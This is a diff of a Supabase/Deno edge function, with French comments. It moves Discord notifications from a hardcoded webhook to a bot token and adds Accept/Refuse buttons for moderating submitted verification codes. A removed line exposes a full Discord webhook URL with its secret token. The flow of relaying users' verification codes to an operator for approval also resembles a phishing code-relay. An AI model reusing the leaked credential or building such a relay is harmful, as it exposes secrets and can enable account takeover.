@@ -6,14 +6,19 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467109225367867412/01lomqYSMEROKtSs82fkkA-9LY7ZN0QwUXZ0PIlIeCsU3cmO9oZ17QOF0_QfKyFjSeOv";
-
 serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
+    const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
+    const DISCORD_CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
+    
+    if (!DISCORD_BOT_TOKEN || !DISCORD_CHANNEL_ID) {
+      throw new Error('Missing Discord configuration');
+    }
+
     const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
     const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
     const supabase = createClient(supabaseUrl, supabaseKey);
@@ -38,9 +43,12 @@ serve(async (req) => {
         footer: { text: `ID: ${data.id}` }
       };
 
-      await fetch(DISCORD_WEBHOOK_URL, {
+      await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
+          'Content-Type': 'application/json' 
+        },
         body: JSON.stringify({ embeds: [embed] }),
       });
 
@@ -49,20 +57,16 @@ serve(async (req) => {
       });
     }
 
-    // Si c'est le code, mettre à jour et envoyer pour validation
+    // Si c'est le code, mettre à jour et envoyer avec vrais boutons
     if (step === "code" && submissionId) {
       await supabase
         .from('submissions')
         .update({ code, status: 'pending' })
         .eq('id', submissionId);
 
-      const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
       const now = new Date();
       const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
       const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-
-      const approveUrl = `${callbackUrl}?id=${submissionId}&action=approve`;
-      const rejectUrl = `${callbackUrl}?id=${submissionId}&action=reject`;
 
       const embed = {
         title: "🔐 Code de vérification soumis",
@@ -76,19 +80,46 @@ serve(async (req) => {
         footer: { text: "En attente de validation par un modérateur" },
       };
 
-      // Contenu du message avec liens cliquables stylisés
-      const content = `
-**🔗 Actions de modération:**
-✅ **[ACCEPTER](${approveUrl})**  |  ❌ **[REFUSER](${rejectUrl})**`;
+      // Message avec VRAIS boutons interactifs
+      const payload = {
+        embeds: [embed],
+        components: [
+          {
+            type: 1, // Action Row
+            components: [
+              {
+                type: 2, // Button
+                style: 3, // Green (Success)
+                label: "Accepter",
+                custom_id: `approve_${submissionId}`,
+                emoji: { name: "✅" }
+              },
+              {
+                type: 2, // Button
+                style: 4, // Red (Danger)
+                label: "Refuser",
+                custom_id: `reject_${submissionId}`,
+                emoji: { name: "❌" }
+              }
+            ]
+          }
+        ]
+      };
 
-      await fetch(DISCORD_WEBHOOK_URL, {
+      const response = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          content: content,
-          embeds: [embed] 
-        }),
+        headers: { 
+          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
+          'Content-Type': 'application/json' 
+        },
+        body: JSON.stringify(payload),
       });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('Discord API error:', errorText);
+        throw new Error(`Discord API error: ${response.status}`);
+      }
 
       return new Response(JSON.stringify({ success: true }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
